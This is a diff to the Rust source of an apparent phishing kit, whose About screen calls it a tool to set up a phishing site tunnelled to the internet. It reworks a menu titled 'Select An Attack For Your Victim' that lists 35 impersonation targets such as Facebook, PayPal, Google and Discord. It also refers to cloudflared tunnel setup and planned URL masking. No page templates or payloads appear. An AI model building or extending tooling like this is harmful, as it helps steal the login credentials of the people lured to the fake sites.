@@ -14,12 +14,13 @@ use crate::constants::USER_AGENT;
 use reqwest::{header, Url};
 use std::fs::{File, OpenOptions, remove_file};
 use std::io::{stdin, stdout, Write};
+use crossterm::event::{Event, KeyCode, KeyEvent, KeyModifiers, read};
 use regex::Regex;
-//#[cfg(target_os = "windows")] use std::thread::sleep;
-// #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
-// use rayon::prelude::*; use regex::Regex;
 use zip::read::ZipFile;
 use zip::ZipArchive;
+//#[cfg(target_os = "windows")] use std::thread::sleep;
+// #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
+// use rayon::prelude::*; use regex::Regex; use zip::read::ZipFile; use zip::ZipArchive;
 use crate::errors::TerminalError;
 use crate::web_server::start_webserver;
 
@@ -242,9 +243,7 @@ async fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
         headers.insert(header::PRAGMA, header::HeaderValue::from_static("no-cache"));
         headers.insert(header::CONTENT_TYPE, header::HeaderValue::from_static("application/x-www-form-urlencoded"));
         // Download the file
-        let client = reqwest::ClientBuilder::new()
-            .default_headers(headers)
-            .cookie_store(true);
+        let client = reqwest::ClientBuilder::new().default_headers(headers).cookie_store(true);
         let response = client.build()?.get(Url::parse(url)?).send().await?;
         log::info!("HTTP Status: {:?}", response.status());
         if response.status() != 200 {
@@ -660,50 +659,78 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
     Ok(())
 }
 
-pub async fn main_menu() -> Result<(), TerminalError> {
-    clear_terminal()?;
+pub fn about() {
+    clear_terminal().unwrap_or_else(|e| {
+        log::error!("Failed to clear terminal: {}", e);
+        error_msg(&format!("Failed to clear terminal: {}", e));
+    });
     banner();
-    let services: [(&str, (u8, u8, u8)); 35] = [
-        ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
-        ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
-        ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
-        ("Snapchat", (255, 252, 0)), ("Linkedin", (0, 119, 181)), ("Ebay", (186, 23, 34)), ("Quora", (185, 43, 39)),
-        ("Protonmail", (84, 172, 210)), ("Spotify", (29, 185, 84)), ("Reddit", (255, 87, 0)), ("Adobe", (237, 23, 43)),
-        ("DeviantArt", (5, 150, 105)), ("Badoo", (230, 74, 25)), ("Origin", (244, 67, 54)), ("DropBox", (0, 126, 229)),
-        ("Yahoo", (150, 0, 155)), ("Wordpress", (33, 117, 155)), ("Yandex", (213, 0, 0)), ("StackOverflow", (244, 67, 54)),
-        ("Vk", (76, 118, 176)), ("XBOX", (16, 124, 16)), ("Mediafire", (49, 80, 195)), ("Gitlab", (233, 30, 99)),
-        ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
-    ];
-
-    println!("{} {} {}\n", "[::]".red(), "Select An Attack For Your Victim".bright_blue(), "[::]".red());
-
-    for (i, (service, color)) in services.iter().enumerate() {
-        let id = format!("{:2}", i + 1);
-        let colorized_service = service.truecolor(color.0, color.1, color.2);
-        print!("{}) {:<15} ", id.red(), colorized_service);
-        if (i + 1) % 3 == 0 {
-            println!();
-        }
-    }
-
-    // If the number of services is not a multiple of 3, we need to print a new line
-    if services.len() % 3 != 0 {
-        println!();
-    }
-
-    println!("{}) {:<15} ", "99".red(), "About".bright_blue());
-    println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
+    println!("{}", "About".green().underline());
+    println!("{}\n", "This is a tool to help you setup a phishing site with a tunnel to the internet.\nThis tool is not responsible for any illegal activities you do with it.\nUse at your own risk.".cyan());
+    println!("{}", "Github".truecolor(66, 133, 244).underline());
+    println!("{}", "https://github.com/skyline69".bright_blue());
     println!();
-    let sel: (&str, Option<&str>, Option<&str>) = site_selection();
-    if sel.1.is_some() || sel.2.is_some() {
-        tunnel_menu(sel.0, sel.2.unwrap_or("").to_string()).await?;
-    }
-    // println!("signaled: {0} | {1}", sel.0, sel.1.unwrap_or("None"));
-    Ok(())
 }
 
-// TODO: Add User Agent to File.
+pub async fn main_menu() -> Result<(), TerminalError> {
+    loop {
+        clear_terminal()?;
+        banner();
+        let services: [(&str, (u8, u8, u8)); 35] = [
+            ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
+            ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
+            ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
+            ("Snapchat", (255, 252, 0)), ("Linkedin", (0, 119, 181)), ("Ebay", (186, 23, 34)), ("Quora", (185, 43, 39)),
+            ("Protonmail", (84, 172, 210)), ("Spotify", (29, 185, 84)), ("Reddit", (255, 87, 0)), ("Adobe", (237, 23, 43)),
+            ("DeviantArt", (5, 150, 105)), ("Badoo", (230, 74, 25)), ("Origin", (244, 67, 54)), ("DropBox", (0, 126, 229)),
+            ("Yahoo", (150, 0, 155)), ("Wordpress", (33, 117, 155)), ("Yandex", (213, 0, 0)), ("StackOverflow", (244, 67, 54)),
+            ("Vk", (76, 118, 176)), ("XBOX", (16, 124, 16)), ("Mediafire", (49, 80, 195)), ("Gitlab", (233, 30, 99)),
+            ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
+        ];
+
+        println!("{} {} {}\n", "[::]".red(), "Select An Attack For Your Victim".bright_blue(), "[::]".red());
+
+        for (i, (service, color)) in services.iter().enumerate() {
+            let id = format!("{:2}", i + 1);
+            let colorized_service = service.truecolor(color.0, color.1, color.2);
+            print!("{}) {:<15} ", id.red(), colorized_service);
+            if (i + 1) % 3 == 0 {
+                println!();
+            }
+        }
+
+        // If the number of services is not a multiple of 3, we need to print a new line
+        if services.len() % 3 != 0 {
+            println!();
+        }
+
+        println!("{}) {:<15} ", "99".red(), "About".bright_blue());
+        println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
+        println!();
+        let sel: (&str, Option<&str>, Option<&str>) = site_selection();
+        if sel.1.is_some() || sel.2.is_some() {
+            tunnel_menu(sel.0, sel.2.unwrap_or("").to_string()).await?;
+            break;
+        } else if sel.0 == "about" {
+            about();
+        println!("{}{}{}\n", "Note: Press '".dimmed(),"q".white().bold(), "' to go back to the main menu.".dimmed());
+            // Wait for user to press enter q
+            loop {
+                if let Ok(Event::Key(event)) = read() {
+                    if event == KeyEvent::new(KeyCode::Char('q'), KeyModifiers::NONE) {
+                        break;
+                    }
+                }
+            }
+
+            continue
+        } else if sel.0 == "exit" {
+            break;
+        }
+    }
+    Ok(())
+}
+// TODO: Fix Cloudflare URL display.
 // TODO: Add LocalXPose Auth.
 // TODO: Add Start with LocalXPose.
 // TODO: Add URL shortener/masking.
-// TODO: Add checks for file download!!!!
